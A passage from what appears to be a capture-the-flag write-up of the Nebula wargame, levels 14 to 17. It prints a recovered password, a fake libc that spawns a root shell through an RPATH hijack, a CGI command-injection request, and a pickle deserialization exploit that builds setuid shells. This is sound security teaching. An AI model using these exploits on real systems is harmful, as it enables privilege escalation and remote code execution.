Key: 11  Char: F     Ord: 70     Res: Q
Key: 12  Char: G     Ord: 71     Res: S
Key: 13  Char: G     Ord: 71     Res: T

Result: ABDEGHJKMNPQST
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The same string was checked using the &lt;code&gt;flag14&lt;/code&gt; cryptor:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level14@nebula:/home/flag14$ ./flag14 -e
AABBCCDDEEFFGG
ABDEGHJKMNPQST
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A match :) Being able to replicate the encryption, meant that the decryption was trivial. Instead of adding 1 to the key, I simply subtracted 1 from the key in order to reverse the string in the &lt;code&gt;token&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;~ # python decrypt.py
String: 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
Strlen: 36  Key start = 0
Key: 0   Char: 8     Ord: 56     Res: 8
Key: 1   Char: 5     Ord: 53     Res: 4
Key: 2   Char: 7     Ord: 55     Res: 5
Key: 3   Char: :     Ord: 58     Res: 7
Key: 4   Char: g     Ord: 103    Res: c
Key: 5   Char: 6     Ord: 54     Res: 1
Key: 6   Char: 7     Ord: 55     Res: 1
Key: 7   Char: ?     Ord: 63     Res: 8
Key: 8   Char: 5     Ord: 53     Res: -
Key: 9   Char: A     Ord: 65     Res: 8
Key: 10  Char: B     Ord: 66     Res: 8
Key: 11  Char: B     Ord: 66     Res: 7
Key: 12  Char: o     Ord: 111    Res: c
Key: 13  Char: :     Ord: 58     Res: -
Key: 14  Char: B     Ord: 66     Res: 4
Key: 15  Char: t     Ord: 116    Res: e
Key: 16  Char: D     Ord: 68     Res: 4
Key: 17  Char: A     Ord: 65     Res: 0
Key: 18  Char: ?     Ord: 63     Res: -
Key: 19  Char: t     Ord: 116    Res: a
Key: 20  Char: I     Ord: 73     Res: 5
Key: 21  Char: v     Ord: 118    Res: a
Key: 22  Char: L     Ord: 76     Res: 6
Key: 23  Char: D     Ord: 68     Res: -
Key: 24  Char: K     Ord: 75     Res: 3
Key: 25  Char: L     Ord: 76     Res: 3
Key: 26  Char: {     Ord: 123    Res: a
Key: 27  Char: M     Ord: 77     Res: 2
Key: 28  Char: Q     Ord: 81     Res: 5
Key: 29  Char: P     Ord: 80     Res: 3
Key: 30  Char: S     Ord: 83     Res: 5
Key: 31  Char: R     Ord: 82     Res: 3
Key: 32  Char: Q     Ord: 81     Res: 1
Key: 33  Char: W     Ord: 87     Res: 6
Key: 34  Char: W     Ord: 87     Res: 5
Key: 35  Char: .     Ord: 46     Res:


Result: 8457c118-887c-4e40-a5a6-33a25353165
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, to solve level14:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level14@nebula:/home/flag14$ su - flag14
Password:
flag14@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level15&#34;&gt;level15&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level15/&#34;&gt;Level15&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.
Clean up after yourself :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Logged in as user &lt;code&gt;level15&lt;/code&gt;, we see 1 file in the &lt;code&gt;flag15&lt;/code&gt; directory called &lt;code&gt;flag15&lt;/code&gt;. Running it simply tells us to &lt;em&gt;strace it!&lt;/em&gt;. Running it with &lt;code&gt;strace&lt;/code&gt; immediately reveals a whole bunch of interesting things about &lt;code&gt;flag15&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level15@nebula:/home/flag15$ strace ./flag15
execve(&amp;quot;./flag15&amp;quot;, [&amp;quot;./flag15&amp;quot;], [/* 20 vars */]) = 0
brk(0)                                  = 0x88c9000
access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786b000
access(&amp;quot;/etc/ld.so.preload&amp;quot;, R_OK)      = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/sse2/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/sse2&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686/sse2/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686/sse2&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/sse2/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/sse2&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15&amp;quot;, {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
open(&amp;quot;/etc/ld.so.cache&amp;quot;, O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7862000
close(3)                                = 0
access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
open(&amp;quot;/lib/i386-linux-gnu/libc.so.6&amp;quot;, O_RDONLY) = 3
read(3, &amp;quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&amp;quot;..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xe78000
mmap2(0xfee000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xfee000
mmap2(0xff1000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xff1000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7861000
set_thread_area({entry_number:-1 -&amp;gt; 6, base_addr:0xb78618d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xfee000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x199000, 4096, PROT_READ)     = 0
munmap(0xb7862000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786a000
write(1, &amp;quot;strace it!\n&amp;quot;, 11strace it!
)            = 11
exit_group(11)                          = ?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are &lt;strong&gt;plenty&lt;/strong&gt; of attempts to load &lt;code&gt;libc.so.6&lt;/code&gt; from various locations! I checked out what is in &lt;code&gt;/var/tmp&lt;/code&gt; and found the original &lt;code&gt;flag15&lt;/code&gt; folder there. It was empty. My initial thought were I need to give it a &lt;code&gt;libc.so.6&lt;/code&gt; to load, but obviously one that will be useful enough to me so that I may gain some form of code execution.&lt;/p&gt;

&lt;p&gt;This challenge had me on another Google ride in order to understand what is going on here. From what I could gather, when a binary is compiled with &lt;code&gt;gcc&lt;/code&gt;, it is possible to add &lt;code&gt;hwcap&lt;/code&gt; support for different processor architectures. It is also possible to tell the linker from where it should load dynamic libraries using a &lt;a href=&#34;http://en.wikipedia.org/wiki/Rpath&#34;&gt;rpath&lt;/a&gt;. In the case of &lt;code&gt;flag15&lt;/code&gt;, the &lt;code&gt;RPATH&lt;/code&gt; is set to &lt;code&gt;/var/tmp/flag15&lt;/code&gt;. We can see this using &lt;code&gt;readelf&lt;/code&gt; and looking at the dynamic section:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/home/flag15$ readelf -d ./flag15

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 0x0000000c (INIT)                       0x80482c0
 0x0000000d (FINI)                       0x80484ac

 [...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok, so that kinda explained the &lt;em&gt;why&lt;/em&gt; its loading libc.so.6 from there, but not really the &amp;lsquo;how this can be useful&amp;rsquo;. I was still a little stuck on the previous &lt;code&gt;LD_PRELOAD&lt;/code&gt; hackery, but had to constantly remind myself that that environment variable will be discarded in the case of the SETUID program.&lt;/p&gt;

&lt;p&gt;I was a little unsure how to get something useful going from here. I touched a file called &lt;code&gt;libc.so.6&lt;/code&gt; in &lt;code&gt;/var/tmp/flag15/&lt;/code&gt; and launched the binary, just to get a starting point:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ touch libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: error while loading shared libraries: /var/tmp/flag15/libc.so.6: file too short
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I was not expecting much from that attempt, but it helped me get started. Eventually I figured I could have a look at &lt;code&gt;flag15&lt;/code&gt; and check which libc function I could &amp;ldquo;override??&amp;rdquo; from the RELO table:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ objdump -R ~flag15/flag15

/home/flag15/flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;puts()&lt;/code&gt; seems like an ok target for me! This is probably the function used to print the &lt;em&gt;strace it!&lt;/em&gt; message. At this stage I figured I could take the same route as I did with the previous &lt;code&gt;LD_PRELOAD&lt;/code&gt; attack, except this time I just &amp;lsquo;fake&amp;rsquo; it in my fake libc. I looked up the &lt;code&gt;puts()&lt;/code&gt; arguments from the man page again and started a new function:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
#include&amp;lt;stdio.h&amp;gt;
int puts(const char *s) {
    printf(&amp;quot;Not the real puts!\n&amp;quot;);
}

level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6

level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ow, that exploded pretty badly it seems. From the error message I figured the function &lt;code&gt;__cxa_finalize&lt;/code&gt; simply did not exist in my library, so all I had to do was add it&amp;hellip; Right? I googled the &lt;a href=&#34;https://refspecs.linuxbase.org/LSB_3.2.0/LSB-Core-generic/LSB-Core-generic/baselib---cxa_finalize.html&#34;&gt;function arguments&lt;/a&gt; and added it to my fake libc:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
#include&amp;lt;stdio.h&amp;gt;
void __cxa_finalize(void * d) {
}

int puts(const char *s) {
    printf(&amp;quot;Not the real puts!\n&amp;quot;);
}
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: relocation error: /home/flag15/flag15: symbol __libc_start_main, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oh! New error. I guess I was making progress. This time there is apparently no &lt;code&gt;__libc_start_main&lt;/code&gt; in the library. At this stage I was a little confused as to what was going on here as this function was also in the RELO table for &lt;code&gt;flag15&lt;/code&gt;. Anyways, as with &lt;code&gt;__cxa_finalize&lt;/code&gt;, I Googled the &lt;a href=&#34;http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html&#34;&gt;function arguments&lt;/a&gt; for this one too and added it to my fake libc. It was also at this stage that I realized I could just use this function instead of &lt;code&gt;puts&lt;/code&gt;, so I went ahead and deleted the other functions:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
#include&amp;lt;stdio.h&amp;gt;

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    return 0;
}

level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion `version-&amp;gt;filename == ((void *)0) || ! _dl_name_match_p (version-&amp;gt;filename, map)&#39; failed!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oh! Another new error :( This time though it was not about a missing function/symbol, but rather something I could not make out by myself. I found little information about this specific error. After a really really long time of searching I finally decided to &lt;code&gt;ldd&lt;/code&gt; &lt;code&gt;flag15&lt;/code&gt; again now that my fake libc is available:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
    linux-gate.so.1 =&amp;gt;  (0x00e47000)
    libc.so.6 =&amp;gt; /var/tmp/flag15/libc.so.6 (0x00761000)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The search term &lt;em&gt;no version information available (required by&lt;/em&gt; was the magic that finally got me towards an answer! I came across &lt;a href=&#34;http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker&#34;&gt;this&lt;/a&gt; and &lt;a href=&#34;http://superuser.com/questions/735736/no-version-information-available-required-by-usr-bin-ssh&#34;&gt;this&lt;/a&gt; post which talks about custom linking scripts. Basically, if I were to create a file with the contents &lt;code&gt;GLIBC_2.0 {};&lt;/code&gt; in it and tell the linker at compile time (with &lt;code&gt;-Wl&lt;/code&gt;) about it, then my problem will go away :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat version.ld
GLIBC_2.0 {
};

level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script=version.ld fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15
    linux-gate.so.1 =&amp;gt;  (0x002b3000)
    libc.so.6 =&amp;gt; /var/tmp/flag15/libc.so.6 (0x00ca0000)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t. My &lt;code&gt;ldd&lt;/code&gt; Error went away :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script=version.ld fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: version `GLIBC_2.1.3&#39; not found (required by /var/tmp/flag15/libc.so.6)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Another version related error. This time though it was for GLIBC version 2.1.3. I spiraled down another Google tunnel with this one and eventually came across static linking options for the linker. Basically, with &lt;code&gt;-Bstatic&lt;/code&gt; and &lt;code&gt;-static-libgcc&lt;/code&gt; we tell the compiler not to link against shared libraries. So, I added these too:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And now we are segfaulting. Great! &lt;strong&gt;Not!&lt;/strong&gt; I poked around &lt;code&gt;gdb&lt;/code&gt; a little and prodded around. Eventually I figured I should check if my &lt;code&gt;__libc_start_main&lt;/code&gt; function is being called before the crash:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
#include&amp;lt;stdio.h&amp;gt;

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    printf(&amp;quot;hi mom!\n&amp;quot;); /* Added this line! */
    return 0;
}
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
hi mom!
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yes! :D So even though I am causing &lt;code&gt;flag15&lt;/code&gt; to crash, I have managed to introduce some code to it. I finally decided to add the &lt;code&gt;system()&lt;/code&gt; call and recompile my fake libc.&lt;/p&gt;

&lt;p&gt;So, to solve level15:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
#include&amp;lt;stdio.h&amp;gt;

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    system(&amp;quot;/bin/sh&amp;quot;);
    return 0;
}
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level16&#34;&gt;level16&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level16/&#34;&gt;Level16&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a perl script running on port 1616.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small Perl program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;#!/usr/bin/env perl

use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub login {
  $username = $_[0];
  $password = $_[1];

  $username =~ tr/a-z/A-Z/; # conver to uppercase
  $username =~ s/\s.*//;        # strip everything after a space

  @output = `egrep &amp;quot;^$username&amp;quot; /home/flag16/userdb.txt 2&amp;gt;&amp;amp;1`;
  foreach $line (@output) {
      ($usr, $pw) = split(/:/, $line);


      if($pw =~ $password) {
          return 1;
      }
  }

  return 0;
}

sub htmlz {
  print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Login resuls&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;quot;);
  if($_[0] == 1) {
      print(&amp;quot;Your login was accepted&amp;lt;br/&amp;gt;&amp;quot;);
  } else {
      print(&amp;quot;Your login failed&amp;lt;br/&amp;gt;&amp;quot;);
  }
  print(&amp;quot;Would you like a cookie?&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;\n&amp;quot;);
}

htmlz(login(param(&amp;quot;username&amp;quot;), param(&amp;quot;password&amp;quot;)));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This script has a seemingly less obvious command injection vulnerability. The &lt;code&gt;egrep&lt;/code&gt; command eventually gets the &lt;code&gt;$username&lt;/code&gt; variable. This after it has gone through 2 sets of filters, one converting the username to uppercase and another truncating everything after a space. These filters are the core of the challenge.&lt;/p&gt;

&lt;p&gt;Similarly to the other command injections, I replicated the filters so that I could print the output and see how I could manipulate them. The biggest problem being the fact that everything was converted to uppercase. Thankfully, that got sorted really quickly when I learnt of the &lt;code&gt;${A,,}&lt;/code&gt; operator in bash. After quite a bit of trying different things, I finally got something that would work. I would first make the egrep happy by redirecting something to it to grep through. Once that was done, I declared a new variable &lt;code&gt;A&lt;/code&gt; and set the command I wanted to run to it. Thereafter I converted it to lowercase and executed it wit &lt;code&gt;${A,,}&lt;/code&gt; and commented the rest of the line out with a hash (#).&lt;/p&gt;

&lt;p&gt;So, to solve level16:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level16@nebula:~$ vim /var/tmp/flag16.sh
level16@nebula:~$ chmod +x /var/tmp/flag16.sh
level16@nebula:~$ cat /var/tmp/flag16.sh
#!/bin/sh
gcc /var/tmp/shell.c -o /var/tmp/flag16
chmod 4777 /var/tmp/flag16
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On my host machine, I requested the web page hosting the perl script, triggering &lt;code&gt;/var/tmp/flag16&lt;/code&gt; to run:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ » curl -v &amp;quot;http://192.168.217.239:1616/index.cgi?$(python -c &#39;import urllib; print urllib.urlencode({ &amp;quot;username&amp;quot; : &amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;lt;/etc/passwd;A=&amp;quot;/var/tmp/flag16.sh&amp;quot;;${A,,};#&amp;quot;&amp;quot;&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;a&amp;quot; })&#39;)&amp;quot;
* Hostname was NOT found in DNS cache
*   Trying 192.168.217.239...
* Connected to 192.168.217.239 (192.168.217.239) port 1616 (#0)
&amp;gt; GET /index.cgi?username=%22%3C%2Fetc%2Fpasswd%3BA%3D%22%2Fvar%2Ftmp%2Fflag16.sh%22%3B%24%7BA%2C%2C%7D%3B%23&amp;amp;password=a HTTP/1.1
&amp;gt; User-Agent: curl/7.37.1
&amp;gt; Host: 192.168.217.239:1616
&amp;gt; Accept: */*
&amp;gt;
* HTTP 1.0, assume close after body
&amp;lt; HTTP/1.0 200 OK
&amp;lt; Content-type: text/html
&amp;lt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Login resuls&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;Your login failed&amp;lt;br/&amp;gt;Would you like a cookie?&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
* Closing connection 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And then, just to read the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level16@nebula:~$ /var/tmp/flag16
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level17&#34;&gt;level17&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level17/&#34;&gt;Level17&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a python script listening on port 10007 that contains a vulnerability.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small Python program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
      clnt.send(&amp;quot;why did you send me &amp;quot; + i + &amp;quot;?\n&amp;quot;)

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind((&#39;0.0.0.0&#39;, 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
      clnt.send(&amp;quot;Accepted connection from %s:%d&amp;quot; % (addr[0], addr[1]))
      server(clnt)
      exit(1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this level, it was immediately obvious that user input was being used to unpickle. This is dangerous as user supplied code could be executed when the unpickle occurs. So, my plan was to write a simple class with a &lt;code&gt;__reduce__&lt;/code&gt; method to pickle and send that over the socket that this code is listening on.&lt;/p&gt;

&lt;p&gt;So, to solve level17:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level17@nebula:/var/tmp/flag17-prep$ cat sploit.py
from netcat import Netcat
import pickle
import os

command = &amp;quot;&amp;quot;&amp;quot;gcc /var/tmp/shell.c -o /var/tmp/flag17; chmod 4777 /var/tmp/flag17&amp;quot;&amp;quot;&amp;quot;

# setup the pickle
class DoCmd(object):
    def __reduce__(self):
        return (os.system, (&#39;{cmd}&#39;.format(cmd = command),))

nc =  Netcat(&#39;127.0.0.1&#39;, 10007)
nc.read()
nc.write(pickle.dumps(DoCmd()))
nc.close()

